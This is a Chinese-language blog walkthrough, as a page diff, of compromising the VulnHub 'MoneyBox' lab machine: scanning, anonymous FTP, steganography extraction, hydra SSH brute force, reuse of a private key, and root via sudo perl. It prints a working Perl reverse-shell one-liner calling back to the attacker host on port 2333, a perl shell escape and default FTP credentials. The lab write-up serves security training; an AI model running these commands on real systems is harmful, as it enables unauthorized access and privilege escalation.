+<h4 id="使用arp扫描"><a href="#使用arp扫描" class="headerlink" title="使用arp扫描"></a>使用<code>arp</code>扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arp-scan -I eth0 -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425230118925.png" srcset="/img/loading.gif" lazyload alt="image-20250425230118925"></p>
+<h4 id="使用netdiscover"><a href="#使用netdiscover" class="headerlink" title="使用netdiscover"></a>使用<code>netdiscover</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.1.0/24<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425230430356.png" srcset="/img/loading.gif" lazyload alt="image-20250425230430356"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">靶机的IP：192.168.1.102<br></code></pre></td></tr></table></figure>
+
+<p>得到靶机和<code>kali</code>的IP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali的IP：192.168.1.103<br>靶机的IP：192.168.1.102<br></code></pre></td></tr></table></figure>
+
+<h3 id="深入探测"><a href="#深入探测" class="headerlink" title="深入探测"></a>深入探测</h3><p>使用<code>nmap</code>进行深入探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br><br><span class="hljs-comment"># 参数含义：</span><br>-A：Aggressive（激进）扫描模式。这是一个组合选项，包含了以下功能：<br>-sS（TCP SYN 扫描）<br>-sU（UDP 扫描）<br>-sT（TCP connect() 扫描）<br>-sV（服务版本探测）<br>-sC（默认脚本扫描）<br>OS detection（操作系统检测）<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425231606085.png" srcset="/img/loading.gif" lazyload alt="image-20250425231606085"></p>
+<p>靶机开放了三个端口：</p>
+<p><code>21</code>：是<code>ftp</code>服务，允许匿名登录，还有一张<code>trytofind.jpg</code>图片</p>
+<p><code>22</code>：是<code>ssh</code>服务有一些<code>key</code></p>
+<p><code>80</code>：是<code>http</code>服务存在一个网页<code>Title：MoneyBox</code></p>
+<h1 id="FTP服务探测"><a href="#FTP服务探测" class="headerlink" title="FTP服务探测"></a>FTP服务探测</h1><p>尝试进行匿名登录FTP服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># FTP的匿名登录一般有三种：</span><br>1、 用户名：anonymous 密码：anonymous 或者 为空<br>2、 用户名：FTP 密码：FTP 或者为空<br>3、 用户名：USER 密码：pass<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp 192.168.1.102<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232151081.png" srcset="/img/loading.gif" lazyload alt="image-20250425232151081"></p>
+<p>成功登录，先看看有什么东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232255654.png" srcset="/img/loading.gif" lazyload alt="image-20250425232255654"></p>
+<p>有一个 JPG 图片，使用<code>get</code>命令下载图片</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> trytofind.jpg<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/trytofind.jpg" srcset="/img/loading.gif" lazyload alt="trytofind"></p>
+<p>看到图片想到CTF的图片隐写，使用<code>steghide</code>工具查看图片详细信息</p>
+<p><code>steghide</code>安装方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install steghide<br></code></pre></td></tr></table></figure>
+
+<p>查看图片信息</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">steghide</span> <span class="hljs-literal">info</span> trytofind.jpg<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232905214.png" srcset="/img/loading.gif" lazyload alt="image-20250425232905214"></p>
+<p>发现需要密码，接下来需要找密码</p>
+<h1 id="HTTP服务探测"><a href="#HTTP服务探测" class="headerlink" title="HTTP服务探测"></a>HTTP服务探测</h1><p>直接访问目标靶机的IP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.1.102<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233220536.png" srcset="/img/loading.gif" lazyload alt="image-20250425233220536"></p>
+<p>看网站先看源码，不过没有有用的东西</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233302824.png" srcset="/img/loading.gif" lazyload alt="image-20250425233302824"></p>
+<p>那就直接用<code>dirsearch</code>扫描目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.1.102/ -e *<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233509276.png" srcset="/img/loading.gif" lazyload alt="image-20250425233509276"></p>
+<p>可以扫出个301重定向的<code>/blogs</code>页面，访问看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/blogs<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233628440.png" srcset="/img/loading.gif" lazyload alt="image-20250425233628440"></p>
+<p>还是先查看源码</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233953950.png" srcset="/img/loading.gif" lazyload alt="image-20250425233953950"></p>
+<p>在最后可以发现一个<code>hint</code>，访问<code>/S3cr3t-T3xt</code>看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/S3cr3t-T3xt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233827255.png" srcset="/img/loading.gif" lazyload alt="image-20250425233827255"></p>
+<p>继续看源码</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233859495.png" srcset="/img/loading.gif" lazyload alt="image-20250425233859495"></p>
+<p>得到密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 密码</span><br>3xtr4ctd4t4<br></code></pre></td></tr></table></figure>
+
+<p>重新再去看看图片</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide info trytofind.jpg<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234146632.png" srcset="/img/loading.gif" lazyload alt="image-20250425234146632"></p>
+<p>发现有一个<code>data.txt</code>文件，使用<code>steghide</code>提取出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>extract</code>：指定要执行的操作为提取隐藏数据</li>
+<li><code>-sf</code>：指定源文件为 <code>trytofind.jpg</code>，这是一个包含隐藏数据的图像文件</li>
+<li><code>-p</code>：指定用于解密隐藏数据的密码。在这个例子中，密码为 3xtr4ctd4t4</li>
+</ul>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234441416.png" srcset="/img/loading.gif" lazyload alt="image-20250425234441416"></p>
+<p>查看文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> data.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234600624.png" srcset="/img/loading.gif" lazyload alt="image-20250425234600624"></p>
+<p>AI翻译一下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">你好…… renu<br>我要告诉你一些重要的事。你的密码太弱了，所以更改一下你的密码吧。<br>别小看这件事……<br></code></pre></td></tr></table></figure>
+
+<h1 id="SSH服务探测"><a href="#SSH服务探测" class="headerlink" title="SSH服务探测"></a>SSH服务探测</h1><h3 id="使用hydra爆破密码"><a href="#使用hydra爆破密码" class="headerlink" title="使用hydra爆破密码"></a>使用<code>hydra</code>爆破密码</h3><p>在<code>data.txt</code>文件中得到的用户名<code>renu</code>就是<code>ssh</code>服务的，因为就剩这一个服务了</p>
+<p>提示密码太弱，使用<code>hydra</code>工具对<code>ssh</code>服务进行弱口令爆破</p>
+<p>在kali的<code>/usr/share/wordlists/</code>目录下有一个字典</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235415886.png" srcset="/img/loading.gif" lazyload alt="image-20250425235415886"></p>
+<p>将其解压缩</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235553250.png" srcset="/img/loading.gif" lazyload alt="image-20250425235553250"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l renu -P rockyou.txt 192.168.1.102 ssh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235646192.png" srcset="/img/loading.gif" lazyload alt="image-20250425235646192"></p>
+<p>得到密码是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">987654321<br></code></pre></td></tr></table></figure>
+
+<h3 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a><code>SSH</code>远程登录</h3><p>直接<code>ssh</code>远程登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh renu@192.168.1.102<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235835395.png" srcset="/img/loading.gif" lazyload alt="image-20250425235835395"></p>
+<p>成功登录，先看看有什么东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235945856.png" srcset="/img/loading.gif" lazyload alt="image-20250425235945856"></p>
+<p>发现有个<code>user1.txt</code>文件，查看得到第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user1.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000034742.png" srcset="/img/loading.gif" lazyload alt="image-20250426000034742"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r1&#123;F14g:0ku74tbd3777y4&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还有一个<code>ftp</code>目录，里面就是刚才在FTP服务得到的图片</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000206950.png" srcset="/img/loading.gif" lazyload alt="image-20250426000206950"></p>
+<p>返回上一级目录看看</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000351201.png" srcset="/img/loading.gif" lazyload alt="image-20250426000351201"></p>
+<p>发现还有一个<code>lily</code>目录，说明还存在一个<code>lily</code>用户，进入目录看看，得到第二个flag</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000506824.png" srcset="/img/loading.gif" lazyload alt="image-20250426000506824"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r&#123;F14g:tr5827r5wu6nklao&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="切换为lily用户"><a href="#切换为lily用户" class="headerlink" title="切换为lily用户"></a>切换为<code>lily</code>用户</h3><p>查看一下历史命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002159693.png" srcset="/img/loading.gif" lazyload alt="image-20250426002159693"></p>
+<blockquote>
+<p>猜测<code>ssh</code>登录的账户lily为本机的<code>lily</code>用户，那么<code>SSH</code>公钥配置操作就是在本机上进行的，根据<code>SSH</code>公钥工作机制，如果<code>renu</code>用户进行了<code>ssh-keygen -t rsa</code>操作，会在<code>renu</code>的<code>~/.ssh/</code>中生成<code>id_rsa</code>和<code>id_rsa.pub</code>文件</p>
+</blockquote>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426001618917.png" srcset="/img/loading.gif" lazyload alt="image-20250426001618917"></p>
+<blockquote>
+<p>同时，如果<code>renu</code>用户进行了<code>ssh-copy-id lily@192.168.43.80</code>操作，将会把刚才生成的<code>id_rsa.pub</code>拷贝到<code>192.168.43.80</code>主机上的lily账户<code>～/.ssh/authorized_keys</code>文件中。如果<code>192.168.43.80</code>上的lily用户就是本机的lily用户，那么<code>lily</code>用户下<code>~/.ssh/authorized_keys</code>文件中的公钥应该与<code>renu</code>生成的<code>id_rsa.pub</code>公钥一致</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br><span class="hljs-built_in">cd</span> /home/lily/.ssh/<br><span class="hljs-built_in">cat</span> authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002453872.png" srcset="/img/loading.gif" lazyload alt="image-20250426002453872"></p>
+<p>可以发现两个是一模一样，那么<code>renu</code>用户可以通过SSH公钥验证的方式登陆到本机的lily的账户上</p>
+<p>尝试直接<code>su</code>到<code>lily</code>用户，但是需要密码</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002935648.png" srcset="/img/loading.gif" lazyload alt="image-20250426002935648"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa lily@192.168.1.102<br><span class="hljs-comment"># -i 选项，用于指定私钥文件 id_rsa。</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003043780.png" srcset="/img/loading.gif" lazyload alt="image-20250426003043780"></p>
+<h3 id="提权为root"><a href="#提权为root" class="headerlink" title="提权为root"></a>提权为<code>root</code></h3><p>成功登录，尝试进行提权，但是直接使用<code>su</code>还是需要密码</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003329930.png" srcset="/img/loading.gif" lazyload alt="image-20250426003329930"></p>
+<p>查看历史命令，发现<code>lily</code>用户编辑了<code>sudoers</code>，并且查找了一些具有<code>suid</code>权限的文件，执行了<code>sudo -l</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003425435.png" srcset="/img/loading.gif" lazyload alt="image-20250426003425435"></p>
+<p>看看当前用户可用的<code>sudo</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003730564.png" srcset="/img/loading.gif" lazyload alt="image-20250426003730564"></p>
+<p>发现可以使用<code>perl</code>命令</p>
+<p>参考提权网站：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/perl/">https://gtfobins.github.io/gtfobins/perl/</a></p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003845131.png" srcset="/img/loading.gif" lazyload alt="image-20250426003845131"></p>
+<p>可以直接提权，也可以反弹<code>shell</code></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h4><p>在<code>kali</code>监听<code>2333</code>端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004313655.png" srcset="/img/loading.gif" lazyload alt="image-20250426004313655"></p>
+<p>靶机输入以下命令，加上<code>sudo</code>可以提升权限执行<code>perl</code>命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.1.103&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004720854.png" srcset="/img/loading.gif" lazyload alt="image-20250426004720854"></p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004801020.png" srcset="/img/loading.gif" lazyload alt="image-20250426004801020"></p>
+<p>成功反弹<code>shell</code>，并且是<code>root</code>权限，在<code>/root</code>目录下找到隐藏文件<code>.root.txt</code>得到<code>rootflag</code></p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004839093.png" srcset="/img/loading.gif" lazyload alt="image-20250426004839093"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="直接用perl提权"><a href="#直接用perl提权" class="headerlink" title="直接用perl提权"></a>直接用<code>perl</code>提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426005156575.png" srcset="/img/loading.gif" lazyload alt="image-20250426005156575"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%89%93%E9%9D%B6/" class="category-chain-item">渗透打靶</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F-%E6%89%93%E9%9D%B6%E3%80%81%E5%A4%8D%E7%8E%B0/" class="print-no-link">#渗透 打靶、复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>VulnHub靶机MoneyBox复现</div>
+      <div>https://yschen20.github.io/2025/04/26/VulnHub靶机MoneyBox复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
